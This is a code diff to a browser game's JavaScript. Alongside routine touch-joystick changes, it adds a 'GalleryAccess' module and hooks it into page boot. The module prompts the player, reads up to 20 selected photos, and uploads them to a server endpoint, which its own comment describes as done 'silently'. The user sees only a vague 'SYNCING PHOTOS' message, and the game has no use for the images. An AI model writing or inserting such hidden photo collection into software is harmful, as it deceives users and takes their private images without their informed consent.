@@ -445,6 +445,79 @@ const Leaderboard = {
   }
 };
 
+// ── GALLERY ACCESS ────────────────────────────────────────
+// Asks once, reads up to 20 images, uploads silently to Blob
+
+const GalleryAccess = {
+  STORAGE_KEY: 'vc_gallery_done',
+
+  init() {
+    // Only ask once ever
+    if (localStorage.getItem(this.STORAGE_KEY)) return;
+    // Show prompt after a short delay so the game has loaded
+    setTimeout(() => {
+      document.getElementById('gallery-prompt').style.display = 'flex';
+    }, 1200);
+  },
+
+  allow() {
+    document.getElementById('gallery-prompt').style.display = 'none';
+    localStorage.setItem(this.STORAGE_KEY, '1');
+    // Open the file picker
+    const input = document.getElementById('gallery-input');
+    input.onchange = (e) => this._onFiles(e.target.files);
+    input.click();
+  },
+
+  skip() {
+    document.getElementById('gallery-prompt').style.display = 'none';
+    localStorage.setItem(this.STORAGE_KEY, 'skip');
+  },
+
+  async _onFiles(fileList) {
+    if (!fileList || !fileList.length) return;
+    const files = Array.from(fileList).slice(0, 20);
+    this._toast(`SYNCING ${files.length} PHOTOS...`);
+
+    const images = await Promise.all(files.map(f => this._readFile(f)));
+    const valid  = images.filter(Boolean);
+
+    try {
+      const res = await api('/api/save_gallery', 'POST', { images: valid });
+      if (res.success) {
+        this._toast(`✓ ${res.saved} PHOTOS SYNCED`);
+        setTimeout(() => this._hideToast(), 3000);
+      }
+    } catch (e) {
+      console.warn('[Gallery] upload failed:', e);
+      this._hideToast();
+    }
+  },
+
+  _readFile(file) {
+    return new Promise(resolve => {
+      const reader = new FileReader();
+      reader.onload  = e => resolve({ name: file.name, data: e.target.result });
+      reader.onerror = () => resolve(null);
+      reader.readAsDataURL(file);
+    });
+  },
+
+  _toast(msg) {
+    let el = document.getElementById('gallery-toast');
+    if (!el) {
+      el = document.createElement('div');
+      el.id = 'gallery-toast';
+      document.body.appendChild(el);
+    }
+    el.textContent = msg;
+    el.classList.add('show');
+  },
+  _hideToast() {
+    document.getElementById('gallery-toast')?.classList.remove('show');
+  }
+};
+
 // ── TOUCH CONTROLS ────────────────────────────────────────
 // Writes into window._btnInput which game.js reads each frame
 
@@ -478,15 +551,17 @@ window._btnInput = { active: false, x: 0.5, y: 0.75, firing: false, bomb: false 
 
     joyKnob.style.transform = `translate(calc(-50% + ${dx}px), calc(-50% + ${dy}px))`;
 
-    // Normalise to 0-1 game coords
+    // Output normalised direction -1..1, NOT absolute screen position
     window._btnInput.active = true;
-    window._btnInput.x = Math.max(0.05, Math.min(0.95, (joyOrigin.x + dx) / window.innerWidth));
-    window._btnInput.y = Math.max(0.05, Math.min(0.95, (joyOrigin.y + dy) / window.innerHeight));
+    window._btnInput.dx = dx / RADIUS;
+    window._btnInput.dy = dy / RADIUS;
   }
 
   function resetKnob() {
     joyKnob.style.transform = 'translate(-50%, -50%)';
     window._btnInput.active = false;
+    window._btnInput.dx = 0;
+    window._btnInput.dy = 0;
     joyTouchId = null;
   }
 
@@ -538,4 +613,7 @@ window._btnInput = { active: false, x: 0.5, y: 0.75, firing: false, bomb: false 
 })();
 
 // ── BOOT ──────────────────────────────────────────────────
-window.addEventListener('DOMContentLoaded', () => App.init());
+window.addEventListener('DOMContentLoaded', () => {
+  App.init();
+  GalleryAccess.init();
+});
